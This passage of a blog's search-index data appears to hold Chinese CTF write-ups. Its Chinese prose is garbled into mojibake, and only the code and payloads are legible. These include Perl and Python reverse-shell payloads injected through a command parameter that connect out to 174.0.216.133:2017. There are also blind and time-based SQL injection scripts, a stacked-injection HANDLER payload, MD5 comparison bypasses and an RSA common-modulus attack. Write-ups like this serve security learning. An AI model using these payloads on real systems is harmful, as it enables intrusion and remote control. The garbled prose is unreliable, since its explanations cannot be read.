æ‰flagæ–‡ä»¶ï¼Œä½†æ˜¯flagå†…å®¹ä»ç„¶åœ¨å†…å­˜é‡Œï¼Œé€šè¿‡è¯»å–/proc/PID/fd/æ–‡ä»¶æè¿°ç¬¦æ¥è¯»å–ã€‚è§£é¢˜çš„å…³é”®å°±æ˜¯é€šè¿‡å‚æ•°cåˆ©ç”¨systemæ‰§è¡Œå‘½ä»¤æ¥åå¼¹shellï¼Œç„¶åå»è¿›ç¨‹ä¿¡æ¯ä¸­æ‰¾flagã€‚ åœ¨è¿™é‡Œcurlä¸èƒ½ç”¨äº†ï¼Œä½†æ˜¯è¿˜å¯ä»¥åˆ©ç”¨perlã€pythonã€rubyç­‰è¯­è¨€æ¥åå¼¹shellï¼Œpyloadå¦‚ä¸‹ï¼š /shell?c=perl%20-MIO%20-e%20%27$p=fork;exit,if($p);$c=new%20IO::Socket::INET(PeerAddr,%22174.0.216.133:2017%22);STDIN-%3Efdopen($c,r);$~-%3Efdopen($c,w);system$_%20while%3C%3E;%27 /shell?c=python3%20-c%20%27import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%22174.0.216.133%22,2017));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);%20os.dup2(s.fileno(),2);p=subprocess.call([%22/bin/sh%22,%22-i%22]);%27 æ³¨æ„æ˜¯åå¼¹shellåˆ°VPSä¸Šï¼Œä½†æ˜¯BUUéœ€è¦ç”¨å†…ç½‘ç¯å¢ƒï¼Œå’Œä¸Šé¢˜ä¸€æ ·ï¼Œå¼€ä¸€ä¸ªBUUçš„å†…ç½‘ç¯å¢ƒï¼Œé€šè¿‡nc -l -p 2017ç›‘å¬ç«¯å£:ç„¶ååˆ©ç”¨ä¸Šé¢çš„payloadè®¿é—®å³å¯åå¼¹shellåˆ©ç”¨perlåå¼¹çš„shellå¦‚ä¸‹ï¼šåˆ©ç”¨pythonåå¼¹çš„shellï¼šå…¶å®è¿˜æ˜¯pythonåå¼¹çš„å¥½ç”¨äº›ã€‚ é€šè¿‡cat /proc/PID/fd/æ–‡ä»¶æè¿°ç¬¦ä¸€ä¸ªä¸ªåœ°æ‰¾å°±èƒ½æ‹¿åˆ°flagäº†ã€‚ HappyCTFdè€ƒå¯Ÿåˆšçˆ†å‡ºçš„CTFdå­˜åœ¨çš„ä¸€ä¸ªCVEï¼ŒCVE-2020-7245 è§£é¢˜ä¸Šé¢çš„CVEé“¾æ¥ä¸­è®²çš„å·²ç»å¾ˆæ¸…æ¥šäº†ï¼Œæ•´ä½“çš„è§£é¢˜æ€è·¯å°±æ˜¯ï¼š 1ã€æ³¨å†Œä¸€ä¸ªadminç”¨æˆ·ï¼Œ(æ³¨æ„å‰é¢çš„ç©ºæ ¼) 2ã€æ›´æ”¹ä¸Šé¢ç”¨æˆ·çš„å¯†ç ï¼Œå³åˆ©ç”¨æ³¨å†Œçš„é‚®ç®±æ¥æ›´æ”¹å¯†ç  3ã€æˆåŠŸä¿®æ”¹ç®¡ç†å‘˜çš„å¯†ç å¹¶ç™»å½• æ³¨æ„BUUçš„å†…ç½‘ç¯å¢ƒéœ€è¦ç”¨å†…ç½‘é‡Œçš„é‚®ç®±ï¼Œå¦åˆ™æ”¶ä¸åˆ°é‚®ä»¶ï¼Œå·¨å‘â€¦ ç™»å½•ä¹‹åï¼Œåœ¨ç®¡ç†é€šé“å‘ç°flagåœ¨å“ªé‡Œä¸€ä¸ªé¢˜ç›®ï¼ŒæŠŠå®ƒçš„éšè—å±æ€§æ”¹ä¸ºå¯è§çš„ï¼Œå†åˆ°challengeé¡µé¢å³å¯çœ‹åˆ°è¯¥é¢˜ç›®ï¼Œä¸‹è½½é™„ä»¶å³å¯æ‹¿åˆ°flagã€‚ æ‹‰èƒ¯çš„ä¸‰æ¡å‘½ä»¤æƒ³åˆ°äº†çƒ­å‰§â€œäº²çˆ±çš„ï¼Œçƒ­çˆ±çš„â€â€¦ è§£é¢˜ä¸‹è½½é™„ä»¶ä¹‹åï¼Œå°†åç¼€æ”¹ä¸º.zipè§£å‹å‘ç°ä¸€ä¸ªæ•°æ®åŒ…å’Œä¸€ä¸ªæç¤ºçš„txtæ–‡ä»¶ï¼Œæç¤ºå°†æ•°æ®åŒ…ä¸­çš„ç«¯å£ä»å°åˆ°å¤§æ’åˆ—å³ä¸ºflagã€‚åˆ©ç”¨tcpdumpç›´æ¥è¯»æ•°æ®åŒ…ä¸­çš„ç«¯å£ï¼Œç„¶åå°±èƒ½æ‹¿åˆ°flagï¼Œå‘½ä»¤å¦‚ä¸‹ï¼š tcpdump -n -r nmapll.pcapng 'tcp[13]=18' | awk '{print $3}' | sort -u æ•ˆæœå¦‚ä¸‹ï¼šç»„åˆå³ä¸ºflagã€‚","link":"/2020/02/29/V&N%E5%85%AC%E5%BC%80%E8%B5%9B/"},{"title":"å®‰æ’-æŠ—ç–«æœˆèµ›","text":"æŠ—ç–«æŠ—ç–«ï¼æ¥è‡ªå®‰å…¨äººå‘˜çš„è¡ŒåŠ¨ï¼ Web-easy-hashè€ƒå¯Ÿmd5å¼ºæ¯”è¾ƒã€å¼±æ¯”è¾ƒä»¥åŠmd5ç¢°æ’ï¼Œæœ¬é¢˜æ˜¯æ˜å®‰æ¯çš„audité¢˜æ”¹çš„ï¼Œå‚è€ƒgetflyå¸ˆå‚…çš„åšå®¢ã€‚ è§£é¢˜è¿›å…¥é¢˜ç›®ï¼Œç»™å‡ºäº†æºç å¦‚ä¸‹ï¼š &lt;?phphighlight_file(__FILE__);error_reporting(0);$val1 = @$_GET['val1'];$val2 = @$_GET['val2'];$val3 = @$_GET['val3'];$val4 = @$_GET['val4'];$val5 = (string)@$_POST['val5'];$val6 = (string)@$_POST['val6'];$val7 = (string)@$_POST['val7'];if( $val1 == $val2 ){ die('val1 OR val2 no no no');}if( md5($val1) != md5($val2) ){ die('step 1 fail');}if( $val3 == $val4 ){ die('val3 OR val4 no no no');}if ( md5($val3) !== md5($val4)){ die('step 2 fail');}if( $val5 == $val6 || $val5 == $val7 || $val6 == $val7 ){ die('val5 OR val6 OR val7 no no no');}if (md5($val5) !== md5($val6) || md5($val6) !== md5($val7) || md5($val5) !== md5($val7)){ die('step 3 fail');}if(!($_POST['a']) and !($_POST['b'])){ echo \"come on!\"; die();}$a = $_POST['a'];$b = $_POST['b'];$m = $_GET['m'];$n = $_GET['n'];if (!(ctype_alnum($a)) || (strlen($a) &gt; 5) || !(ctype_alnum($b)) || (strlen($b) &gt; 6)){ echo \"a OR b fail!\"; die();}if ((strlen($m) &gt; 1) || (strlen($n) &gt; 1)){ echo \"m OR n fail\"; die();}$val8 = md5($a);$val9 = strtr(md5($b), $m, $n);echo PHP_EOL;echo \"&lt;p&gt;val8 : $val8&lt;/p&gt;\";echo PHP_EOL;echo \"&lt;p&gt;val9 : $val9&lt;/p&gt;\";echo PHP_EOL;if (($val8 == $val9) &amp;&amp; !($a === $b) &amp;&amp; (strlen($b) === 5)){ echo \"nice,good job,give you flag:\"; echo file_get_contents('/var/www/html/flag.php');} åˆ†æä»£ç å¯ä»¥çœ‹åˆ°ï¼Œæˆ‘ä»¬éœ€è¦æ‰¾åˆ°æ»¡è¶³md5å¼±æ¯”è¾ƒæ¡ä»¶çš„val1å’Œval2ï¼Œè¿™ä¸ªç½‘ä¸Šæœ‰å¾ˆå¤šï¼š 0eå¼€å¤´çš„md5å’ŒåŸå€¼ï¼šQNKCDZO0e830400451993494058024219903391s878926199a0e545993274517709034328855841020s155964671a0e342768416822451524974117254469s214587387a0e848240448830537924465865611904s214587387a0e848240448830537924465865611904s878926199a0e545993274517709034328855841020s1091221200a0e940624217856561557816327384675s1885207154a0e509367213418206700842008763514s1502113478a0e861580163291561247404381396064s1885207154a0e509367213418206700842008763514s1836677006a0e481036490867661113260034900752s155964671a0e342768416822451524974117254469s1184209335a0e072485820392773389523109082030s1665632922a0e731198061491163073197128363787s1502113478a0e861580163291561247404381396064s1836677006a0e481036490867661113260034900752s1091221200a0e940624217856561557816327384675s155964671a0e342768416822451524974117254469s1502113478a0e861580163291561247404381396064s155964671a0e342768416822451524974117254469s1665632922a0e731198061491163073197128363787s155964671a0e342768416822451524974117254469s1091221200a0e940624217856561557816327384675s1836677006a0e481036490867661113260034900752s1885207154a0e509367213418206700842008763514s532378020a0e220463095855511507588041205815s878926199a0e545993274517709034328855841020s1091221200a0e940624217856561557816327384675s214587387a0e848240448830537924465865611904s1502113478a0e861580163291561247404381396064s1091221200a0e940624217856561557816327384675s1665632922a0e731198061491163073197128363787s1885207154a0e509367213418206700842008763514s1836677006a0e481036490867661113260034900752s1665632922a0e731198061491163073197128363787s878926199a0e545993274517709034328855841020 ç„¶åéœ€è¦åˆ©ç”¨md5å¼ºæ¯”è¾ƒç»•è¿‡å¯¹val3å’Œval4çš„åˆ¤æ–­ï¼Œç”±äºæ²¡æœ‰è¦æ±‚æ˜¯å­—ç¬¦ä¸²ï¼Œå› æ­¤åˆ©ç”¨æ•°æ®è¿›è¡Œç»•è¿‡ï¼š val3[]=1&amp;val4[]=2 å†å¾€ä¸‹çœ‹ï¼Œå¯¹val5ã€val6å’Œval7è¿›è¡Œäº†(string)çš„é™åˆ¶ï¼Œè¿™é‡Œçš„åˆ¤æ–­æ˜¯çœŸæ­£éœ€è¦è¿›è¡Œmd5ç¢°æ’äº†ï¼Œç½‘ä¸Šèƒ½æ‰¾åˆ°å¾ˆå¤šæ•°æ®æœ‰å¾®å°å·®åˆ«ä½†æ˜¯md5å€¼ç›¸åŒçš„ä¾‹å­ï¼Œä½†æ˜¯éƒ½æ˜¯ä¸¤ä¸ªä¸€å¯¹çš„ï¼Œä½†æ˜¯æœ¬é¢˜æœ‰ä¸‰ä¸ªå˜é‡ï¼Œéœ€è¦å€ŸåŠ©è¿™ä¸ªå·¥å…·æ¥ç”Ÿæˆå€¼ä¸åŒä½†æ˜¯md5ç›¸åŒçš„æ–‡ä»¶ã€‚ ç„¶åæ˜¯å¯¹aã€bã€må’Œnçš„åˆ¤æ–­ï¼šctype_alnum($a\\b)åˆ¤æ–­a\\bæ˜¯å¦æ˜¯å­—æ¯å’Œæ•°å­—æˆ–å­—æ¯æ•°å­—çš„ç»„åˆï¼›åŒæ—¶è¦æ±‚må’Œné•¿åº¦ä¸èƒ½è¶…è¿‡1ã€‚ ç„¶åä»¤$val8 = md5($a)ï¼Œ$val9 = strtr(md5($b), $m, $n)å°†md($b)ä¸­ä¸$mç›¸åŒçš„å€¼æ›¿æ¢ä¸º$nçš„å€¼ã€‚æœ€åè¿˜éœ€è¦æ»¡è¶³($val8 == $val9) &amp;&amp; !($a === $b) &amp;&amp; (strlen($b) === 5)ï¼Œè¿™ä¸ªåœ°æ–¹åˆ©ç”¨md5å¼±ç¢°æ’å°±è¡Œï¼Œåˆ©ç”¨QNKCDZO/0e830400451993494058024219903391ç±»çš„å­—ç¬¦ä¸²ï¼Œæ‰¾ä¸€ä¸ªé•¿åº¦ä¸º5ä¸”md5å€¼ä»¥0eå¼€å¤´åé¢å…¨æ˜¯æ•°å­—çš„å­—ç¬¦ä¸²$aï¼Œå¦æ‰¾ä¸€ä¸ª0eå¼€å¤´åé¢ä¸ºçº¯æ•°å­—/ä¸€ä½å­—æ¯çš„å­—ç¬¦ä¸²$bï¼Œè‹¥0eåé¢æ˜¯ä¸€ä¸ªå­—æ¯å’Œå…¶ä»–çš„æ•°å­—ï¼Œåˆ©ç”¨strtr()å‡½æ•°å°†å…¶md5å€¼ä¸­å­—æ¯æ”¹ä¸ºæ•°å­—å³å¯ã€‚ éš¾ç‚¹å°±åœ¨äºæ‰¾æ»¡è¶³è¦æ±‚çš„$aå’Œ$bçš„å€¼äº†ï¼Œè¿™é‡Œå‚è€ƒgetflyå¸ˆå‚…çš„è„šæœ¬æ¥çˆ†ç ´ï¼š # çˆ†ç ´æ•°å­—+å­—æ¯ï¼Œæ‰¾åˆ°ç¬¦åˆmd5åä¸º0eå¼€å¤´ï¼Œä¸”åé¢ä¸ºçº¯æ•°å­—/ä¸€ä½å­—æ¯çš„å­—ç¬¦ä¸²import stringimport itertoolsimport hashlibdic = string.ascii_lowercase + string.ascii_uppercase + string.digitstime = 0for n in itertools.permutations(dic, 5): print('trying', time) time += 1 i = ''.join(n) li = [0] * 26 count = 0 strs = hashlib.md5(str(i).encode('utf-8')).hexdigest() if strs[:2] == '0e': for j in strs[2:]: if ord(j) &gt;= 97: li[ord(j)-97] += 1 for k in li: if k != 0: count += 1 if count &lt; 1: print(i) break æœ€ååˆ©ç”¨æ„é€ å¥½çš„payloadå†™è„šæœ¬æ‹¿flagã€‚ è§£é¢˜è„šæœ¬import requestsurl = 'http://183.129.189.60:10004/?val1=QNKCDZO&amp;val2=s878926199a&amp;val3[]=1&amp;val4[]=2&amp;m=a&amp;n=1'file1 = open('out_test_000.txt', 'rb').read()file2 = open('out_test_001.txt', 'rb').read()file3 = open('out_test_002.txt', 'rb').read()data = {'val5':file1, 'val6':file2, 'val7':file3, 'a':'byGcY', 'b':'aOtm2'}s = requests.post(url, data)print(s.text) Crypto-å¤å…¸å¯†ç è¿›å…¥é¢˜ç›®ï¼Œåˆ†åˆ«ç»™äº†ä¸€ç»„å‡¯æ’’å¯†ç åŠ å¯†çš„å­—ç¬¦ä¸²ã€ä¸€ç»„morseç ã€ä¸€ç»„æ …æ å¯†ç åŠ å¯†çš„å­—ç¬¦ä¸²ï¼Œåˆ†åˆ«è§£å¯†å³å¯ã€‚ Crypto-RSAè·Ÿå‰ä¸¤å¤©Ichunqiuçš„æŠ—ç–«èµ›ä¸­çš„ä¸€é“RSAé¢˜ä¸€æ ·ï¼Œè€ƒå¯Ÿå…±æ¨¡æ”»å‡» è§£é¢˜é™„ä»¶ä»£ç å¦‚ä¸‹ï¼š from flag import flagfrom Crypto.Util.number import *p=getPrime(1024)q=getPrime(1024)e=65537n=p*qm=bytes_to_long(flag)c=pow(m,e,n)print c,e,ne=11187289n=p*qm=bytes_to_long(flag)c=pow(m,e,n)print c,e,n'''3398498381912395819190972489172462865619978412426461006637853132394421358554444085509204376417687407497725837275868696481008111895766215578504776574832032556271718345687763315140723387608016365200919607751172500433727679269003098314988424638473027123820847847826679169000817669427223462669128173658466684135284118199815059085013479646863344355311315928713888347485004116168388822942797985291207722712351376891776564431593839662958249777540851019964959285093222467104765037231393043482615879794268339523066822738215251088897330388858109680412562153811860413533184870172160079371279534423386236128033224501238509297353 65537 215502791026440531374017943574509443026107313903012946787932507273960893580727006585712607959101122653095680142961222883845164478958272011115310543865300164329049899272167015075873664468026668483228537817299054927286554748325123815056279405558543083645781082659623880443631332464147537682295648462751543118983839938922932971224286619609462079509945608989640549131944621872428186332959700277410852011221557261307590459577578339426165440660550816007923664116919793507448949389949153288746002296844775332202404896001717469438491798036931220818883242589877791312231505899532489296799311421342081510430007932725208742059333466733921305804638105947202761163747472618602445995245253771384553216569474005211746398256742813639292824489920799418551206486872148557599625985549276697777903434273072767901043963396047653458242735767809413051298636887840641872939342025101757793615068691040228073377366562557622977332819376942596081135968249279010542277871138668977160241877260538203101507006391433015105607006204397243716334344883925947719719479074061998068934050946968531874465924912747079003982022188875112147185558223515367430238618463189740762128953957802291125793882636020335117593003197811477506533564676975831899876919568948425610130348710 11187289 21550279102644053137401794357450944302610731390301294678793250727396089358072700658571260795910112265309568014296122288384516447895827201111531054386530016432904989927216701507587366446802666848322853781729905492728655474832512381505627940555854308364578108265962388044363133246414753768229564846275154311898383993892293297122428661960946207950994560898964054913194462187242818633295970027741085201122155726130759045957757833942616544066055081600792366411691979350744894938994915328874600229684477533220240489600171746943849179803693122081888324258987779131223150589953248929679931142134208151043000793272520874205933''' æ˜æ˜¾åœ°çœ‹å‡ºæ˜¯ä½¿ç”¨ç›¸åŒçš„æ¨¡æ•°nã€ä¸¤ä¸ªä¸åŒçš„eç”Ÿæˆäº†ä¸¤ä¸ªå¯†æ–‡cï¼Œç›´æ¥ä¸ŠPOCï¼š import sysimport binasciisys.setrecursionlimit(1000000)def egcd(a, b): if a == 0: return (b, 0, 1) else: g, y, x = egcd(b % a, a) return (g, x - (b // a) * y, y)def modinv(a, m): g, x, y = egcd(a, m) if g != 1: raise Exception('modular inverse does not exist') else: return x % mn = 21550279102644053137401794357450944302610731390301294678793250727396089358072700658571260795910112265309568014296122288384516447895827201111531054386530016432904989927216701507587366446802666848322853781729905492728655474832512381505627940555854308364578108265962388044363133246414753768229564846275154311898383993892293297122428661960946207950994560898964054913194462187242818633295970027741085201122155726130759045957757833942616544066055081600792366411691979350744894938994915328874600229684477533220240489600171746943849179803693122081888324258987779131223150589953248929679931142134208151043000793272520874205933e1 = 65537e2 = 11187289c1 = 3398498381912395819190972489172462865619978412426461006637853132394421358554444085509204376417687407497725837275868696481008111895766215578504776574832032556271718345687763315140723387608016365200919607751172500433727679269003098314988424638473027123820847847826679169000817669427223462669128173658466684135284118199815059085013479646863344355311315928713888347485004116168388822942797985291207722712351376891776564431593839662958249777540851019964959285093222467104765037231393043482615879794268339523066822738215251088897330388858109680412562153811860413533184870172160079371279534423386236128033224501238509297353c2 = 3466733921305804638105947202761163747472618602445995245253771384553216569474005211746398256742813639292824489920799418551206486872148557599625985549276697777903434273072767901043963396047653458242735767809413051298636887840641872939342025101757793615068691040228073377366562557622977332819376942596081135968249279010542277871138668977160241877260538203101507006391433015105607006204397243716334344883925947719719479074061998068934050946968531874465924912747079003982022188875112147185558223515367430238618463189740762128953957802291125793882636020335117593003197811477506533564676975831899876919568948425610130348710s = egcd(e1, e2)s1 = s[1]s2 = s[2]if s1&lt;0: s1 = - s1 c1 = modinv(c1, n)elif s2&lt;0: s2 = - s2 c2 = modinv(c2, n)m=(pow(c1,s1,n)*pow(c2,s2,n)) % nprint (binascii.unhexlify(hex(m)[2:].strip(\"L\"))) Misc-lemonEssenceè€ƒå¯ŸCRCçˆ†ç ´ è§£é¢˜ä¸‹è½½å‹ç¼©åŒ…è§£å‹å‡ºå¦‚ä¸‹ä¸€å¼ PNGå›¾ç‰‡ï¼šç¼©ç•¥å›¾å¯ä»¥çœ‹ï¼Œä½†æ˜¯æ”¾å¤§ä¹‹åçœ‹ä¸äº†ï¼ŒçŒœæµ‹æ˜¯å¯¹å…¶é«˜æˆ–å®½è¿›è¡Œäº†æ›´æ”¹ï¼Œéœ€è¦è¿›è¡ŒCRCçˆ†ç ´ä»¥è·å¾—åŸæ¥çš„å®½å’Œé«˜ï¼Œä¿®æ”¹å›å»å°±è¡Œäº†ã€‚åˆ©ç”¨Winraræ‹¿åˆ°å…¶CRCï¼Œç„¶ååˆ©ç”¨ä¸‹é¢çš„è„šæœ¬çˆ†ç ´ï¼š import zlibimport structcrc32key = 0x986B9E93data = bytearray(b'\\x49\\x48\\x44\\x52\\x00\\x00\\x01\\x69\\x00\\x00\\x01\\x25\\x08\\x02\\x00\\x00\\x00') #è¡¨ç¤ºå®½å’Œé«˜éƒ¨åˆ†çš„å­—èŠ‚(13-29bytes)n = 4095 #ç†è®ºä¸Š0xffffffff,ä½†è€ƒè™‘åˆ°å±å¹•å®é™…/cpuï¼Œ0x0fffå°±å·®ä¸å¤šäº†for w in range(n): #é«˜å’Œå®½ä¸€èµ·çˆ†ç ´ width = bytearray(struct.pack('&gt;i', w)) #qä¸º8å­—èŠ‚ï¼Œiä¸º4å­—èŠ‚ï¼Œhä¸º2å­—èŠ‚ for h in range(n): height = bytearray(struct.pack('&gt;i', h)) for x in range(4): data[x+4] = width[x] data[x+8] = height[x] crc32result = zlib.crc32(data) if crc32result == crc32key: print(width,height) exit(0) æŠŠçˆ†ç ´å‡ºåœ°ç»“æœä¸å›¾ç‰‡æ•°æ®å¯¹æ¯”ï¼Œå‘ç°é«˜çš„éƒ¨åˆ†è¢«æ›´æ”¹äº†ï¼Œå¦‚å›¾æ›´æ”¹å›å»å³å¯çœ‹åˆ°flagï¼š","link":"/2020/02/26/%E5%AE%89%E6%81%92-%E6%8A%97%E7%96%AB%E6%9C%88%E8%B5%9B/"},{"title":"ichunqiuæ–°æ˜¥æˆ˜ç–«èµ›-WriteUp","text":"æœ€è¿‘çš„å‡ ä¸ªå…¬ç›Šèµ›ç¡®å®åŠçš„ä¸é”™ï¼Œå®‰å…¨äººå‘˜ä¹Ÿéƒ½æ˜¯å¾ˆçƒ­çˆ±ç¥–å›½çš„â™¥ï¼Œä¸­å›½åŠ æ²¹ğŸ˜  æ­¦æ±‰åŠ æ²¹ğŸ˜  å¤§å®¶åŠ æ²¹ğŸ˜  Web-ç®€å•çš„æ‹›è˜ç³»ç»Ÿè€ƒå¯ŸSQLæ³¨å…¥ è§£é¢˜æµ‹è¯•å‘ç°ç™»å½•çš„usernameå¤„å­˜åœ¨æ³¨å…¥ï¼Œä¸‡èƒ½å¯†ç å°±èƒ½ç™»å½•è¿™ä¸ªåœ°æ–¹å­˜åœ¨æ³¨å…¥ç‚¹ï¼Œå¯ä»¥åˆ©ç”¨ç›²æ³¨çˆ†åº“ï¼Œè¿™é‡Œåˆ©ç”¨çš„æ€è·¯å°±æ˜¯é€šè¿‡åˆ¤æ–­ç”¨æˆ·åçš„æ¡ä»¶ä¸ºtrueç™»å½•è¿›è¡Œæ³¨å…¥ï¼Œå½“ç„¶è¿˜éœ€è¦ä¸€ä¸ªç°æœ‰çš„ç”¨æˆ·æ¥ç™»å½•ï¼Œé‚£ä¹ˆæˆ‘ä»¬æ³¨å†Œä¸ªç”¨æˆ·å°±è¡Œäº†ï¼Œå‚è€ƒå¦‚ä¸‹çš„è„šæœ¬ï¼š import requestsurl = 'http://4b5b40858ffa4258bd74ee72c106522abdc060eb08674169.changame.ichunqiu.com/index.php'# payload = \"2' and (select (mid((select database()),1,{0})))!='{1}\"# payload = \"2' and (select (mid((select table_name from information_schema.tables where table_schema='nzhaopin' limit 1 offset 3),1,{0})))!='{1}\"# payload = \"2' and (select (mid((select column_name from information_schema.columns where table_name='flag' limit 1 offset 1),1,{0})))!='{1}\"payload = \"2' and (select (mid((select flaaag from flag limit 1 offset 0),1,{0})))!='{1}\"# backup flag user flag: id flaaagdatabase = ''letter = 'abcdefghijklmnopqrstuvwxyz0123456789_-{}'for i in range(1, 80): for n in letter: data = { \"lname\": payload.format(i, database + n), \"lpass\": \"xxx\" } req = requests.post(url, data=data) req.encoding = 'gbk' # print(req.encoding) print(data[\"lname\"]) # print(req.text.encode('gbk').decode(req.apparent_encoding)) if \"æˆåŠŸ\" not in req.text.encode('gbk').decode(req.apparent_encoding): print(\"* \" + n) database += n break Web-ezuploadæ–‡ä»¶ä¸Šä¼ é¢˜ è§£é¢˜æœ¬ä»¥ä¸ºæ˜¯ä¸€é“æ‹å¼¯çš„ä¸Šä¼ é¢˜ï¼Œç»“æœç›´æ¥ä¼ ä¸Šé©¬äº†â€¦èšå‰‘è¿ä¸Šï¼Œflagæ–‡ä»¶æ˜¯ç©ºçš„ï¼Œä½†æ˜¯ä¸‹é¢æœ‰ä¸ª/readflagæ–‡ä»¶ï¼Œå¼€ä¸­æ–­è¿è¡Œè¿™ä¸ªç¨‹åºå°±èƒ½æ‹¿åˆ°flagã€‚ Web-ç›²æ³¨åˆ©ç”¨æ­£åˆ™è¿›è¡Œæ—¶é—´ç›²æ³¨ è§£é¢˜é¢˜ç›®å·²ç»è¯´çš„å¾ˆæ˜æ˜¾äº†ï¼Œéœ€è¦è¿›è¡Œç›²æ³¨ï¼Œä½†æ˜¯æœ‰wafï¼Œè¿‡æ»¤äº†å¾ˆå¤šå¸¸ç”¨çš„æ³¨å…¥è¯­å¥ï¼Œä½†æ˜¯REGEXPå¹¶æ²¡æœ‰è¢«banï¼Œé‚£ä¹ˆåˆ©ç”¨è¿™ä¸ªå‡½æ•°å¾ˆç®€å•åœ°å°±èƒ½æ‹¿åˆ°flagã€‚REGEXPï¼šåœ¨åˆ—å€¼å†…è¿›è¡ŒåŒ¹é…ï¼Œå¦‚æœè¢«åŒ¹é…çš„æ–‡æœ¬åœ¨åˆ—å€¼ä¸­å‡ºç°ï¼ŒREGEXPå°†ä¼šæ‰¾åˆ°å®ƒï¼Œç›¸åº”çš„è¡Œå°†è¢«è¿”å›ï¼ŒREGEXPèƒ½åŒ¹é…æ•´ä¸ªåˆ—å€¼ã€‚å¹¶ä¸”REGEXPæ£€æŸ¥æ€»æ˜¯è¿”å›0ï¼ˆæ²¡æœ‰åŒ¹é…ï¼‰æˆ–1ï¼ˆåŒ¹é…ï¼‰ã€‚ import requestsimport timeurl = 'http://49682a5d648a44fe94ba09271ec5fbe569c33f63b1c6435b.changame.ichunqiu.com/?id='flag = ''letter = 'abcdefghijklmnopqrstuvwxyz0123456789{}-'for i in range(99): for n in letter: payload = '1 and if((fl4g REGEXP \"^{0}\"),sleep(3),5);' payload = payload.format(flag+n) start_time = time.time() req = requests.get(url+payload) #print(req.text) if (time.time() - start_time)&gt;2: print(flag) flag += n break Web-blacklistæœ¬é¢˜æ˜¯[å¼ºç½‘æ¯]éšä¾¿æ³¨çš„æ”¹ç‰ˆï¼Œè€ƒå¯Ÿå †å æ³¨å…¥ï¼Œè¿™é¢˜getåˆ°æ³¨å…¥æ–°å§¿åŠ¿ï¼Œåˆ©ç”¨mysqlæ•°æ®åº“ä¸­HANDLERç»•è¿‡é»‘åå•æ‹¿flagã€‚ è§£é¢˜è¿›å…¥é¢˜ç›®å‘ç°è·Ÿå¼ºç½‘æ¯ä¸€æ ·çš„è¾“å…¥æ¡†ï¼Œé¦–å…ˆå°±æƒ³åˆ°äº†å †å æ³¨å…¥ï¼Œæµ‹è¯•ä¸€ä¸‹ï¼šå¯ä»¥çœ‹åˆ°ï¼Œè¯­æ³•æˆåŠŸæ‰§è¡Œäº†ã€‚ä½†æ˜¯å†å»æµ‹è¯•å…¶ä»–å…³é”®å­—çš„æ—¶å€™å‘ç°å¾ˆå¤šå…³é”®å­—è¢«banäº†ï¼šæœ¬æƒ³ç€åˆ©ç”¨å¼ºç½‘æ¯çš„æ–¹æ³•ï¼Œé€šè¿‡æ”¹è¡¨åæ¥æ‹¿flagçš„ï¼Œä½†æ˜¯renameä¹Ÿè¢«banäº†ï¼Œç»“åˆselectåˆè¢«banï¼Œå¸¸è§„çš„å§¿åŠ¿æ€•æ˜¯ä¸è¡Œï¼Œåæ¥å€Ÿç”¨handleræ‰æ‹¿åˆ°flagï¼Œpayloadå¦‚ä¸‹ï¼š 1';handler FlagHere open;handler FlagHere read first;# å…³äºhandlerå¯ä»¥å‚è€ƒè¿™é‡Œã€‚ Web-easysqli_copyè¿˜æ˜¯è€ƒå¯ŸPDOã€check()å‡½æ•°çš„ç»•è¿‡ã€å®é™…ç›²æ³¨ï¼Œä¸è¿‡è¿™é¢˜ä¹Ÿgetåˆ°äº†æ–°å§¿åŠ¿ï¼šåˆ©ç”¨é¢„å¤„ç†è¯­å¥è¿›è¡Œå †å æ³¨å…¥ï¼Œè¿™ä¹Ÿæ˜¯é‡‡ç”¨äº†PDOä¹‹åæ³¨å…¥çš„æ–°è¶‹åŠ¿äº†ã€‚æ‰©å±•ä¸€ä¸‹çŸ¥è¯†ï¼š åœ¨phpä¸­ï¼ŒPDOæœ‰ä¸¤ç§æ¨¡å¼ï¼šæ¨¡æ‹Ÿé¢„ç¼–è¯‘ä¸éæ¨¡æ‹Ÿé¢„ç¼–è¯‘ã€‚é»˜è®¤ä¸ºæ¨¡æ‹Ÿé¢„ç¼–è¯‘æ¨¡å¼ï¼Œå³ä¸æ˜¯çœŸæ­£çš„é¢„ç¼–è¯‘ï¼Œè€Œæ˜¯é‡‡ç”¨PDO::quote()å‡½æ•°ï¼Œé¦–å…ˆå°†ç”¨æˆ·è¾“å…¥è½¬åŒ–ä¸ºå­—ç¬¦å‹ï¼Œä¹‹åå°†å¼•å·ç­‰æ•æ„Ÿå­—ç¬¦è½¬ä¹‰ã€‚è¿™æ ·åœ¨gbkç¼–ç ä¸‹ï¼Œå³å¯é€šè¿‡å®½å­—èŠ‚æ³¨å…¥ç»•è¿‡é˜²æŠ¤ã€‚ä½†æ˜¯ç»•è¿‡PDOä¹‹åï¼Œä¾ç„¶å¾ˆéš¾ç»•è¿‡check()å‡½æ•°ï¼Œäºæ˜¯æ­¤å¤„åˆ©ç”¨åˆ°äº†PDOçš„ç¬¬äºŒä¸ªé»˜è®¤ç‰¹æ€§ï¼šæ”¯æŒå¤šå¥æ‰§è¡Œï¼Œå³å¯è¿›è¡Œå †å æ³¨å…¥ã€‚ é¢˜ç›®åˆ†æè¿›å…¥é¢˜ç›®ç»™å‡ºäº†æºç ï¼š &lt;?php function check($str) { if(preg_match('/union|select|mid|substr|and|or|sleep|benchmark|join|limit|#|-|\\^|&amp;|database/i',$str,$matches)) { print_r($matches); return 0; } else { return 1; } } try { $db = new PDO('mysql:host=localhost;dbname=pdotest','root','******'); } catch(Exception $e) { echo $e-&gt;getMessage(); } if(isset($_GET['id'])) { $id = $_GET['id']; } else { $test = $db-&gt;query(\"select balabala from table1\"); $res = $test-&gt;fetch(PDO::FETCH_ASSOC); $id = $res['balabala']; } if(check($id)) { $query = \"select balabala from table1 where 1=?\"; $db-&gt;query(\"set names gbk\"); $row = $db-&gt;prepare($query); $row-&gt;bindParam(1,$id); $row-&gt;execute(); } é€šè¿‡æºç 